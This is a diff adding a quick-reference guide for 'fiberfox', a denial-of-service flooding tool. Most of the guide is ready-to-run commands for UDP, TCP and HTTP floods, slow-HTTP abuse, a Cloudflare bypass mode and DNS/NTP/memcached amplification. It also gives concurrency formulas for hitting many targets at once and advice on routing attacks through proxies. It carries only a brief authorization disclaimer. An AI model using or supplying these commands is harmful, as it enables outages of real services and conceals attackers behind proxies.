@@ -1,0 +1,309 @@
+╔════════════════════════════════════════════════════════════════════════════╗
+║                   FIBERFOX - QUICK REFERENCE GUIDE                         ║
+╚════════════════════════════════════════════════════════════════════════════╝
+
+═══════════════════════════════════════════════════════════════════════════════
+  MULTIPLE TARGETS - HOW TO USE
+═══════════════════════════════════════════════════════════════════════════════
+
+✅ YES - MULTIPLE TARGETS ARE FULLY SUPPORTED!
+
+Method 1: Command Line (Simple, 1-5 targets)
+───────────────────────────────────────────
+  fiberfox --targets tcp://10.0.0.1:8080 http://10.0.0.2:80 https://example.com
+
+Method 2: Configuration File (Recommended for multiple targets)
+──────────────────────────────────────────────────────────────
+  # Create targets.txt
+  tcp://10.0.0.1:8080
+  http://10.0.0.2:80
+  https://example.com:443
+  
+  # Run
+  fiberfox --targets-config targets.txt
+
+Method 3: Remote Configuration File
+────────────────────────────────────
+  fiberfox --targets-config http://server.local/targets.txt
+
+Method 4: Combined (CLI + Config File)
+───────────────────────────────────────
+  fiberfox --targets tcp://10.0.0.1:8080 --targets-config targets.txt
+
+═══════════════════════════════════════════════════════════════════════════════
+  EXAMPLES BY ATTACK TYPE
+═══════════════════════════════════════════════════════════════════════════════
+
+UDP Attack (L4) - 10 targets
+────────────────────────────
+  Optimal fibers = 10 targets × 2 = 20
+  Command:
+  $ fiberfox --targets-config targets.txt \
+      --concurrency 20 --strategy UDP --duration-seconds 60
+
+TCP Attack (L4) - 10 targets
+─────────────────────────────
+  Optimal fibers = 10 targets × 25 = 250
+  Command:
+  $ fiberfox --targets-config targets.txt \
+      --concurrency 250 --strategy TCP \
+      --rpc 100 --duration-seconds 300
+
+HTTP GET Attack (L7) - 5 targets
+─────────────────────────────────
+  Optimal fibers = 5 targets × 100 = 500
+  Command:
+  $ fiberfox --targets-config targets.txt \
+      --concurrency 500 --strategy GET --duration-seconds 600
+
+STRESS Attack (L7) - 20 targets
+────────────────────────────────
+  Optimal fibers = 20 targets × 50 = 1000
+  Command:
+  $ fiberfox --targets-config targets.txt \
+      --concurrency 1000 --strategy STRESS \
+      --duration-seconds 1800
+
+═══════════════════════════════════════════════════════════════════════════════
+  PERFORMANCE TUNING
+═══════════════════════════════════════════════════════════════════════════════
+
+Formula:
+  Total Concurrency = Number of Targets × Fibers Per Target
+
+Fibers Per Target Guidelines:
+  Strategy        │ Recommended │ Min   │ Max
+  ────────────────┼─────────────┼───────┼────────
+  UDP             │ 2           │ 1     │ 5
+  TCP             │ 25          │ 10    │ 50
+  HTTP/GET        │ 100         │ 50    │ 200
+  STRESS/BYPASS   │ 50          │ 10    │ 200
+  SLOW            │ 200         │ 100   │ 500
+  CONNECTION      │ 200         │ 100   │ 500
+
+Quick Calculator:
+  5 targets + TCP attack  → 5 × 25 = 125 fibers
+  10 targets + GET attack → 10 × 100 = 1000 fibers
+  50 targets + STRESS     → 50 × 50 = 2500 fibers
+
+═══════════════════════════════════════════════════════════════════════════════
+  TARGET FORMAT SUPPORT
+═══════════════════════════════════════════════════════════════════════════════
+
+Supported Formats (FiberFox auto-detects protocol):
+
+  Format                    Protocol    Port (if not specified)
+  ────────────────────────────────────────────────────────
+  127.0.0.1:8080           TCP         8080
+  tcp://127.0.0.1:8080     TCP (explicit)  8080
+  http://example.com       HTTP        80
+  https://example.com      HTTPS       443
+  example.com              TCP         80
+  example.com:3000         TCP         3000
+
+═══════════════════════════════════════════════════════════════════════════════
+  CREATING TARGET FILES
+═══════════════════════════════════════════════════════════════════════════════
+
+Simple List:
+────────────
+  echo -e "tcp://10.0.0.1:8080\ntcp://10.0.0.2:8080\ntcp://10.0.0.3:8080" > targets.txt
+
+From Bash Loop (Generate 50 targets):
+──────────────────────────────────────
+  for i in {1..50}; do echo "tcp://10.0.0.$i:8080"; done > targets.txt
+
+From CSV (Convert to targets):
+───────────────────────────────
+  cut -d',' -f1,2 servers.csv | sed 's/,/:/' | sed 's/^/tcp:\/\//' > targets.txt
+
+Mixed Protocols:
+────────────────
+  cat > targets.txt << 'END'
+  http://api.service1.local:8080
+  https://api.service2.local:443
+  tcp://db.service3.local:5432
+  http://cache.service4.local:6379
+  END
+
+═══════════════════════════════════════════════════════════════════════════════
+  MONITORING PROGRESS
+═══════════════════════════════════════════════════════════════════════════════
+
+During Attack:
+──────────────
+  • Console shows progress every 10 seconds
+  • Format: "🦊 URL  PROGRESS%  Sent  Rate  Proxies"
+  • Example: "🦊 http://10.0.0.1:8080  45.23%  512 MiB in 45.00s (11.4 MiB/s)"
+
+Final Statistics:
+─────────────────
+  After attack completes, shows table with:
+  │ Target │ Sessions │ Packets │ Traffic │ Rate (Out) │ Quality │
+  
+  Quality Column (sparkline):
+    ████ ░░░░ = Good distribution (target rejecting evenly)
+    ░░░░ ████ = Bad distribution (few connections successful)
+
+═══════════════════════════════════════════════════════════════════════════════
+  REAL-WORLD SCENARIOS
+═══════════════════════════════════════════════════════════════════════════════
+
+Scenario 1: Test Multiple Microservices in Cluster
+──────────────────────────────────────────────────
+  cat > targets.txt << 'END'
+  http://auth-service:3000
+  http://api-service:3001
+  http://web-service:3002
+  http://gateway-service:8080
+  END
+  
+  fiberfox --targets-config targets.txt --concurrency 400 --strategy STRESS
+
+Scenario 2: Load Test Across Data Center (50 servers)
+──────────────────────────────────────────────────────
+  for i in {1..50}; do echo "tcp://dc$((i % 4 + 1))-server$((i / 4 + 1)):8080"; done > dc.txt
+  
+  fiberfox --targets-config dc.txt --concurrency 2500 --strategy TCP
+
+Scenario 3: Test Behind Load Balancer with Multiple IPs
+───────────────────────────────────────────────────────
+  # Get all IPs for load balanced domain
+  nslookup lb.example.com | grep Address | cut -d: -f2 | tr -d ' ' > lb_targets.txt
+  
+  fiberfox --targets-config lb_targets.txt --concurrency 1000 --strategy GET
+
+Scenario 4: Multi-Target through Multiple Proxies
+──────────────────────────────────────────────────
+  # Multiple targets
+  cat > targets.txt << 'END'
+  http://target1:80
+  http://target2:80
+  http://target3:80
+  END
+  
+  # Multiple proxies
+  cat > proxies.txt << 'END'
+  http://proxy1:8080
+  http://proxy2:8080
+  socks5://proxy3:1080
+  END
+  
+  fiberfox --targets-config targets.txt --proxies-config proxies.txt \
+           --concurrency 1500 --strategy BYPASS
+
+═══════════════════════════════════════════════════════════════════════════════
+  COMMON PARAMETERS
+═══════════════════════════════════════════════════════════════════════════════
+
+Essential Parameters:
+  --targets                     CLI targets (space-separated)
+  --targets-config FILE         Read targets from file (1 per line)
+  -c, --concurrency N           Number of fibers (threads)
+  -s, --strategy STRATEGY       Attack type (UDP, TCP, GET, STRESS, etc.)
+  -d, --duration-seconds N      How long to attack (seconds)
+
+Optional Parameters:
+  --proxies-config FILE         Proxy servers (1 per line)
+  --rpc N                       Packets per connection (default: 100)
+  --packet-size N               Packet size in bytes (default: 1024)
+  --log-level LEVEL             DEBUG/INFO/ERROR/WARN
+  --connection-timeout-seconds  Proxy timeout
+
+Full Help:
+  fiberfox --help
+
+═══════════════════════════════════════════════════════════════════════════════
+  TROUBLESHOOTING
+═══════════════════════════════════════════════════════════════════════════════
+
+Issue: "Cannot reach target"
+  Fix: Check target format: tcp://IP:PORT or http://domain
+       Verify network connectivity: nc -zv IP PORT
+       Check firewall rules
+
+Issue: Uneven distribution across targets
+  Fix: Increase concurrency (should be >= targets × 20)
+       Use config file instead of CLI arguments
+
+Issue: Memory usage too high
+  Fix: Reduce --concurrency (use fewer fibers)
+       Use UDP strategy (less memory than TCP)
+       Reduce --rpc value
+
+Issue: Slow startup with many targets
+  Fix: Targets are resolved in parallel - should be <30s for 1000 targets
+       Use --log-level ERROR to reduce output overhead
+
+Issue: Proxies getting marked dead
+  Fix: Check proxy connectivity: curl -x http://proxy:port http://example.com
+       Ensure proxy authentication if needed
+       Verify proxy port and protocol
+
+═══════════════════════════════════════════════════════════════════════════════
+  ATTACK STRATEGIES EXPLAINED
+═══════════════════════════════════════════════════════════════════════════════
+
+L4 ATTACKS (Network Layer):
+  UDP       | Raw UDP flood (minimal setup, high volume possible)
+  TCP       | TCP flood on open connections
+  CONNECTION| Open many TCP connections, keep alive
+
+L7 ATTACKS (Application Layer):
+  GET       | HTTP GET requests
+  STRESS    | Large HTTP requests pipelined
+  BYPASS    | HTTP requests with response reading
+  SLOW      | Slow HTTP protocol abuse
+  CFBUAM    | Cloudflare bypass technique
+  AVB       | Attacks using byte-level delays
+
+AMPLIFICATION (Reflection Attacks):
+  DNS, NTP, CLDAP, MEMCACHED, CHAR, ARD, RDP
+
+═══════════════════════════════════════════════════════════════════════════════
+  BEST PRACTICES
+═══════════════════════════════════════════════════════════════════════════════
+
+✓ DO:
+  • Use config files for more than 3 targets
+  • Start with small tests (10-60 seconds)
+  • Monitor progress - don't fire and forget
+  • Use proxies for distributed attacks
+  • Test on authorized systems only
+  • Document your testing parameters
+  • Check target statistics after each run
+
+✗ DON'T:
+  • Attack without authorization (it's illegal!)
+  • Use excessive concurrency (start low, increase gradually)
+  • Mix too many different target protocols
+  • Leave targets running 24/7 without monitoring
+  • Use public proxies for sensitive testing
+  • Test on production systems without backup/rollback plan
+
+═══════════════════════════════════════════════════════════════════════════════
+  SAMPLE ONE-LINERS
+═══════════════════════════════════════════════════════════════════════════════
+
+Single Target:
+  fiberfox --targets tcp://10.0.0.1:8080 --concurrency 100 --strategy TCP
+
+3 Targets, 5 minutes:
+  fiberfox --targets tcp://10.0.0.1:8080 tcp://10.0.0.2:8080 tcp://10.0.0.3:8080 \
+           --concurrency 75 --duration-seconds 300 --strategy STRESS
+
+100 targets from file:
+  fiberfox --targets-config targets.txt --concurrency 5000 --strategy STRESS
+
+With proxies:
+  fiberfox --targets-config targets.txt --proxies-config proxies.txt \
+           --concurrency 2000 --strategy BYPASS
+
+Long duration test:
+  fiberfox --targets-config targets.txt --concurrency 512 --strategy TCP \
+           --duration-seconds 3600 --log-level ERROR
+
+═══════════════════════════════════════════════════════════════════════════════
+
+Need help? Run: fiberfox --help
+
